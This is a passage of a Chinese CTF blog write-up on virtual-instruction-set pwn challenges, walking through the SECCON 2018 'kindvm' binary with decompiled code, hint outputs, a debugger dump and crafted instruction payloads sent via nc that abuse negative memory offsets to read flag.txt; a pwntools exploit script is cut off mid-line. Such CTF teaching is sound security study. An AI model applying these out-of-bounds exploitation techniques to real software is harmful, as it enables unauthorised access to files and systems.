<!DOCTYPE html><html lang="zh-TW" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>虚拟指令集pwn | KANGEL</title><meta name="description" content="虚拟指令集pwn"><meta name="keywords" content="pwn,gxzy"><meta name="author" content="kangel"><meta name="copyright" content="kangel"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/2.png"><link rel="preconnect" href="//cdn.jsdelivr.net"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="虚拟指令集pwn"><meta name="twitter:description" content="虚拟指令集pwn"><meta name="twitter:image" content="https://j-kangel.github.io/article_cover/logo.jpg"><meta property="og:type" content="article"><meta property="og:title" content="虚拟指令集pwn"><meta property="og:url" content="https://j-kangel.github.io/2020/04/10/虚拟指令集pwn/"><meta property="og:site_name" content="KANGEL"><meta property="og:description" content="虚拟指令集pwn"><meta property="og:image" content="https://j-kangel.github.io/article_cover/logo.jpg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'false'
var t = Cookies.get("theme");
if (autoChangeMode == '1'){
const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

if (t === undefined){
  if (isLightMode) activateLightMode()
  else if (isDarkMode) activateDarkMode()
  else if (isNotSpecified || hasNoSupport){
    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
    now = new Date();
    hour = now.getHours();
    isNight = hour < 6 || hour >= 18
    isNight ? activateDarkMode() : activateLightMode()
}
} else if (t == 'light') activateLightMode()
else activateDarkMode()


} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.15/dist/snackbar.min.css"><link rel="canonical" href="https://j-kangel.github.io/2020/04/10/虚拟指令集pwn/"><link rel="prev" title="kernel pwn(one)" href="https://j-kangel.github.io/2020/04/16/kernel-pwn-one/"><link rel="next" title="tcache_stashing_unlink_attack" href="https://j-kangel.github.io/2020/04/10/tcache-stashing-unlink-attack/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  highlight_copy: 'true',
  highlight_lang: 'false',
  highlight_shrink: 'false',
  copy: {
    success: '複製成功',
    error: '複製錯誤',
    noSupport: '瀏覽器不支持'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: '按',
    message_next: '鍵將本頁加入書籤'
  },
  runtime_unit: '天',
  copyright: undefined,
  copy_copyright_js: false,
  ClickShowText: undefined,
  medium_zoom: 'true',
  Snackbar: {"bookmark":{"title":"Snackbar.bookmark.title","message_prev":"按","message_next":"鍵將本頁加入書籤"},"chs_to_cht":"你已切換為繁體","cht_to_chs":"你已切換為簡體","day_to_night":"你已切換為深色模式","night_to_day":"你已切換為淺色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"}
  
}</script></head><body><div id="header"> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">KANGEL</a></span><i class="fa fa-bars fa-fw toggle-menu pull_right close" aria-hidden="true"></i><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li><li><a class="site-page" href="/photo/"><i class="fa-fw fa fa-photo"></i><span> Photo</span></a></li></ul></div></div></span><span class="pull_right" id="search_button"></span></div></div><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="lazyload avatar_img" src="/img/2.png" onerror="onerror=null;src='/img/friend_404.gif'"></div><div class="mobile_post_data"><div class="mobile_data_item is_center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">50</div></a></div></div><div class="mobile_data_item is_center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">標籤</div><div class="length_num">32</div></a></div></div><div class="mobile_data_item is_center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分類</div><div class="length_num">14</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li><li><a class="site-page" href="/photo/"><i class="fa-fw fa fa-photo"></i><span> Photo</span></a></li></ul></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目錄</div><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#前言"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">前言</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#例题1"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">例题1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#例题2"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">例题2</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#程序逻辑"><span class="toc_mobile_items-number">3.1.</span> <span class="toc_mobile_items-text">程序逻辑</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#指令功能"><span class="toc_mobile_items-number">3.2.</span> <span class="toc_mobile_items-text">指令功能</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#例题3"><span class="toc_mobile_items-number">4.</span> <span class="toc_mobile_items-text">例题3</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#程序逻辑-1"><span class="toc_mobile_items-number">4.1.</span> <span class="toc_mobile_items-text">程序逻辑</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Reference"><span class="toc_mobile_items-number">5.</span> <span class="toc_mobile_items-text">Reference</span></a></li></ol></div></div><div id="body-wrap"><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目錄</div><div class="sidebar-toc__progress"><span class="progress-notice">你已經讀了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例题1"><span class="toc-number">2.</span> <span class="toc-text">例题1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例题2"><span class="toc-number">3.</span> <span class="toc-text">例题2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#程序逻辑"><span class="toc-number">3.1.</span> <span class="toc-text">程序逻辑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#指令功能"><span class="toc-number">3.2.</span> <span class="toc-text">指令功能</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例题3"><span class="toc-number">4.</span> <span class="toc-text">例题3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#程序逻辑-1"><span class="toc-number">4.1.</span> <span class="toc-text">程序逻辑</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li></ol></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/article_cover/logo.jpg)"><div id="post-info"><div id="post-title"><div class="posttitle">虚拟指令集pwn</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 發表於 2020-04-10<span class="post-meta__separator">|</span><i class="fa fa-history" aria-hidden="true"></i> 更新於 2020-04-12</time><span class="post-meta__separator mobile_hidden">|</span><span class="mobile_hidden"><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/pwn学习/">pwn学习</a></span><div class="post-meta-wordcount"><i class="fa fa-file-word-o post-meta__icon" aria-hidden="true"></i><span>字數總計: </span><span class="word-count">3.1k</span><span class="post-meta__separator">|</span><i class="fa fa-clock-o post-meta__icon" aria-hidden="true"></i><span>閲讀時長: 15 分鐘</span><span class="post-meta__separator">|</span><i class="fa fa-eye post-meta__icon" aria-hidden="true">       </i><span>閲讀量: </span><span id="busuanzi_value_page_pv"></span></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>近来很多比赛都有虚拟指令集pwn的题目，漏洞都是常规的漏洞，但是题目还算新颖，有一种计组做实验的感觉。</p>
<p>这类题目主要就是搞清楚指令集的作用，需要对字节、符号、移位等知识有非常清晰的认识，废话不多说，先来一道题目试试。</p>
<h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><p>来源：<a href="https://github.com/SECCON/SECCON2018_online_CTF/tree/master/Pwn/kindvm" target="_blank" rel="noopener">seccon-2018-kindvm</a></p>
<p>checksec</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/mnt/hgfs/shared/vmpwn/kindvm/kindvm&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>静态分析，程序流程如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ctf_setup();       <span class="comment">//初始化设置</span></span><br><span class="line">  kindvm_setup();    <span class="comment">//设置虚拟指令集</span></span><br><span class="line">  input_insn();      <span class="comment">//输入指令</span></span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">void</span>))(kc + <span class="number">16</span>))();   <span class="comment">//执行某个函数</span></span><br><span class="line">  <span class="keyword">while</span> ( !*(_DWORD *)(kc + <span class="number">4</span>) )     <span class="comment">//当kc+4为true时终止执行</span></span><br><span class="line">    exec_insn();     <span class="comment">//执行指令</span></span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">void</span>))(kc + <span class="number">20</span>))();   <span class="comment">//执行某个函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重点关注kindvm_setup()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kindvm_setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">0x18</span>u);</span><br><span class="line">  kc = (<span class="keyword">int</span>)v0;</span><br><span class="line">  *v0 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(kc + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  v1 = kc;</span><br><span class="line">  *(_DWORD *)(v1 + <span class="number">8</span>) = input_username(); <span class="comment">//输入name,溢出会执行hint1()</span></span><br><span class="line">  *(_DWORD *)(kc + <span class="number">12</span>) = <span class="string">"banner.txt"</span>;</span><br><span class="line">  *(_DWORD *)(kc + <span class="number">16</span>) = func_greeting;  <span class="comment">//执行指令前的函数</span></span><br><span class="line">  *(_DWORD *)(kc + <span class="number">20</span>) = func_farewell;  <span class="comment">//执行指令后的函数</span></span><br><span class="line">  mem = <span class="built_in">malloc</span>(<span class="number">0x400</span>u);     <span class="comment">//内存在堆上</span></span><br><span class="line">  <span class="built_in">memset</span>(mem, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">  reg = <span class="built_in">malloc</span>(<span class="number">0x20</span>u);      <span class="comment">//寄存器也在堆上</span></span><br><span class="line">  <span class="built_in">memset</span>(reg, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  insn = <span class="built_in">malloc</span>(<span class="number">0x400</span>u);    <span class="comment">//存放指令也在堆上</span></span><br><span class="line">  result = <span class="built_in">memset</span>(mem, <span class="string">'A'</span>, <span class="number">0x400</span>u);</span><br><span class="line">  func_table[<span class="number">0</span>] = (<span class="keyword">int</span>)insn_nop;</span><br><span class="line">  dword_804B0C4 = (<span class="keyword">int</span>)insn_load;  <span class="comment">//0x01 + 寄存器号（0-7）+ 内存地址（2字节，小于0x3fc）</span></span><br><span class="line">  dword_804B0C8 = (<span class="keyword">int</span>)insn_store; <span class="comment">//0x02 + 内存地址（2字节，小于0x3fc) + 寄存器号（0-7）</span></span><br><span class="line">  dword_804B0CC = (<span class="keyword">int</span>)insn_mov;   <span class="comment">//0x03 + 寄存器号a + 寄存器号b ;a = b</span></span><br><span class="line">  dword_804B0D0 = (<span class="keyword">int</span>)insn_add;   <span class="comment">//0x04 + 寄存器号a + 寄存器号b a+=b a如果小于0，那么执行hint3()</span></span><br><span class="line">  dword_804B0D4 = (<span class="keyword">int</span>)insn_sub;   <span class="comment">//0x05 + 寄存器号a + 寄存器号b a-=b</span></span><br><span class="line">  dword_804B0D8 = (<span class="keyword">int</span>)insn_halt;  <span class="comment">//0x06 设置kc+4 = 1   终止执行</span></span><br><span class="line">  dword_804B0DC = (<span class="keyword">int</span>)insn_in;    <span class="comment">//0x07 + 寄存器号 + 立即数（32位 4字节）将立即数存入寄存器</span></span><br><span class="line">  dword_804B0E0 = (<span class="keyword">int</span>)insn_out;   <span class="comment">//0x08 + 寄存器号 打印寄存器的值</span></span><br><span class="line">  dword_804B0E4 = (<span class="keyword">int</span>)insn_hint;  <span class="comment">//0x09 执行hint2()</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在我们来看一下hint</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input your name : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line"> _   _ _       _   _    ____ _____ _____   _ </span><br><span class="line">| | | (_)_ __ | |_/ |  / ___| ____|_   _| | |</span><br><span class="line">| |_| | | &apos;_ \| __| | | |  _|  _|   | |   | |</span><br><span class="line">|  _  | | | | | |_| | | |_| | |___  | |   |_|</span><br><span class="line">|_| |_|_|_| |_|\__|_|  \____|_____| |_|   (_)</span><br><span class="line">                                             </span><br><span class="line"></span><br><span class="line">Nice try! The theme of this binary is not Stack-Based BOF!</span><br><span class="line">However, your name is not meaningless...</span><br></pre></td></tr></table></figure>
<p>hint1：name溢出即可，提示name有作用，但不是溢出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  kindvm socat tcp-l:9999,fork exec:./kindvm</span><br><span class="line"></span><br><span class="line">➜  kindvm echo -e &apos;kangel\n\x09&apos; |nc 127.0.0.1 9999                          </span><br><span class="line">Input your name : Input instruction :  _    _           _                 </span><br><span class="line">| | _(_)_ __   __| |_   ___ __ ___  </span><br><span class="line">| |/ / | &apos;_ \ / _` \ \ / / &apos;_ ` _ \ </span><br><span class="line">|   &lt;| | | | | (_| |\ V /| | | | | |</span><br><span class="line">|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|</span><br><span class="line">                                    </span><br><span class="line">Instruction start!</span><br><span class="line"> _   _ _       _   ____     ____ _____ _____   _ </span><br><span class="line">| | | (_)_ __ | |_|___ \   / ___| ____|_   _| | |</span><br><span class="line">| |_| | | &apos;_ \| __| __) | | |  _|  _|   | |   | |</span><br><span class="line">|  _  | | | | | |_ / __/  | |_| | |___  | |   |_|</span><br><span class="line">|_| |_|_|_| |_|\__|_____|  \____|_____| |_|   (_)</span><br><span class="line">                                                 </span><br><span class="line">Nice try! You can analyze vm instruction and execute it!</span><br><span class="line">Flag file name is &quot;flag.txt&quot;.</span><br></pre></td></tr></table></figure>
<p>hint2：输入’\x09’，提示filename为”flag.txt”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">_<span class="function">DWORD *<span class="title">insn_add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v1; <span class="comment">// [esp+Ah] [ebp-Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="keyword">load_insn_uint8_t</span>();   <span class="comment">//寄存器a</span></span><br><span class="line">  v2 = <span class="keyword">load_insn_uint8_t</span>();   <span class="comment">//寄存器b</span></span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7u</span> )</span><br><span class="line">    kindvm_abort();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">7u</span> )</span><br><span class="line">    kindvm_abort();</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)reg + v1) &gt;= <span class="number">0</span> )   </span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">  result = (<span class="keyword">char</span> *)reg + <span class="number">4</span> * v1;</span><br><span class="line">  *result += *((_DWORD *)reg + v2);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (_DWORD *)*((_DWORD *)reg + v1);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt; <span class="number">0</span> )    <span class="comment">//寄存器a为负数</span></span><br><span class="line">      hint3();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此可以先往reg[0]中写入负数，然后 add reg[0], reg[0] </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  kindvm echo -e &apos;kangel\n\x07\x00\xff\xff\xff\xff\x04\x00\x00&apos; |nc 127.0.0.1 9999</span><br><span class="line">Input your name : Input instruction :  _    _           _                 </span><br><span class="line">| | _(_)_ __   __| |_   ___ __ ___  </span><br><span class="line">| |/ / | &apos;_ \ / _` \ \ / / &apos;_ ` _ \ </span><br><span class="line">|   &lt;| | | | | (_| |\ V /| | | | | |</span><br><span class="line">|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|</span><br><span class="line">                                    </span><br><span class="line">Instruction start!</span><br><span class="line"> _   _ _       _   _____    ____ _____ _____   _ </span><br><span class="line">| | | (_)_ __ | |_|___ /   / ___| ____|_   _| | |</span><br><span class="line">| |_| | | &apos;_ \| __| |_ \  | |  _|  _|   | |   | |</span><br><span class="line">|  _  | | | | | |_ ___) | | |_| | |___  | |   |_|</span><br><span class="line">|_| |_|_|_| |_|\__|____/   \____|_____| |_|   (_)</span><br><span class="line">                                                 </span><br><span class="line">Nice try! You can cause Integer Overflow!</span><br><span class="line">The value became minus value. Minus value is important.</span><br></pre></td></tr></table></figure>
<p>hint3：提示有整数溢出</p>
<p>我们现在来看一下指令退出后的函数func_farewell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> func_farewell()</span><br><span class="line">&#123;</span><br><span class="line">  open_read_write(*(<span class="keyword">char</span> **)(kc + <span class="number">12</span>));   <span class="comment">//banner.txt</span></span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"Execution is end! Thank you!\n"</span>, <span class="number">0x1D</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>banner.txt和name的地址都存放在堆上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20wx kc - 8</span><br><span class="line">0x804c000:      0x00000000      0x00000021      0x00000000      0x00000000</span><br><span class="line">0x804c010:      0x0804c028      0x080491b2      0x08048f89      0x08048fba</span><br><span class="line">0x804c020:      0x00000000      0x00000011      0x67616c66      0x7478742e</span><br><span class="line">0x804c030:      0x00000000      0x00000409      0x41414141      0x41414141</span><br><span class="line">0x804c040:      0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">pwndbg&gt; x/s 0x0804c028</span><br><span class="line">0x804c028:      &quot;flag.txt&quot;</span><br><span class="line">pwndbg&gt; x/s 0x080491b2</span><br><span class="line">0x80491b2:      &quot;banner.txt&quot;</span><br><span class="line">pwndbg&gt; p/x mem</span><br><span class="line">$3 = 0x804c038</span><br></pre></td></tr></table></figure>
<p>因此 read <code>name</code> -&gt; write it to <code>banner.txt</code>.即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  kindvm echo -e &apos;flag.txt\n\x01\x07\xff\xd8\x02\xff\xdc\x07\x06&apos; | nc 127.0.0.1 9999                                                  </span><br><span class="line">Input your name : Input instruction :  _    _           _                 </span><br><span class="line">| | _(_)_ __   __| |_   ___ __ ___  </span><br><span class="line">| |/ / | &apos;_ \ / _` \ \ / / &apos;_ ` _ \ </span><br><span class="line">|   &lt;| | | | | (_| |\ V /| | | | | |</span><br><span class="line">|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|</span><br><span class="line">                                    </span><br><span class="line">Instruction start!</span><br><span class="line">SECCON&#123;s7ead1ly_5tep_by_5tep&#125;</span><br><span class="line">Execution is end! Thank you!</span><br></pre></td></tr></table></figure>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p=process(<span class="string">'./kindvm'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your name : "</span>)</span><br><span class="line">p.sendline(<span class="string">'flag.txt'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input instruction : "</span>) </span><br><span class="line">payload=<span class="string">"\x01\x03\xff\xd8"</span> <span class="comment">#load 03,[0xffd8]  reg3&lt;=*(mem-40) 0xffd8 = -40</span></span><br><span class="line">payload+=<span class="string">"\x02\xff\xdc\x03"</span> <span class="comment">#store [0xffdc],03 *(mem-36)&lt;=reg3  0xffdc = 